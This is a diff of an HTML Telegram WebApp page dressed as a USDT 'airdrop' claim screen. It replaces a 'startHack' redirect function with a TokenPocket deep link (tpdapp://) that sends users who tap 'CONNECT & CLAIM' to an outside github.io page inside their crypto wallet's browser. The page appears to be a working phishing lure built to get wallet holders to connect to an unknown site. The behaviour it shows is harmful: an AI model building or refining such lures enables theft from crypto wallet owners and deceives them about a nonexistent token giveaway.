@@ -38,6 +38,7 @@
             text-transform: uppercase;
             box-shadow: 0 0 10px #ff0000;
             text-decoration: none;
+            display: inline-block;
         }
         .glitch {
             animation: pulse 1.5s infinite;
@@ -54,48 +55,20 @@
         <h2>> SYSTEM: AIRDROP_DETECTED</h2>
         <p>> STATUS: READY_TO_CLAIM</p>
         <p>> TOKEN: USDT (TRC-20)</p>
-        <p id="log">> CONNECTION: AWAITING_USER...</p>
+        <p id="log">> CONNECTION: AWAITING_USER_INPUT...</p>
     </div>
 
-    <a href="javascript:void(0)" onclick="startHack()" class="btn glitch">
+    <a href="tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fpatrickdafhao-code.github.io%2Fcook%2F%22%7D" 
+       class="btn glitch" 
+       onclick="document.getElementById('log').innerHTML = '<p style=\'color:#0f0\'>> [SYSTEM]: NATIVE_LINK_TRIGGERED...</p>'; tg.HapticFeedback.impactOccurred('heavy');">
         CONNECT & CLAIM
     </a>
 
 <script>
-    // 1. 初始化 Telegram
+    // 仅仅保留初始化和全屏功能，不再干涉跳转
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
-
-    function startHack() {
-        // 震动反馈
-        tg.HapticFeedback.notificationOccurred('success');
-        
-        const log = document.getElementById('log');
-        const myUrl = "https://patrickdafhao-code.github.io/cook/";
-        
-        // 2. 构造 TokenPocket 协议
-        const tpLink = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl}));
-        // 构造通用协议
-        const dappLink = "dapp://" + myUrl.replace("https://", "");
-
-        log.innerHTML = "<p style='color:#0f0'>> [TARGET]: REDIRECTING...</p>";
-
-        // 3. 强制跳转逻辑
-        try {
-            // 尝试直接拉起
-            tg.openLink(tpLink, { try_browser: true });
-            
-            // 如果 1.5秒没跳走，尝试通用协议
-            setTimeout(() => {
-                tg.openLink(dappLink, { try_browser: true });
-            }, 1500);
-            
-        } catch (e) {
-            // 兜底方案
-            window.location.href = tpLink;
-        }
-    }
 </script>
 </body>
 </html>
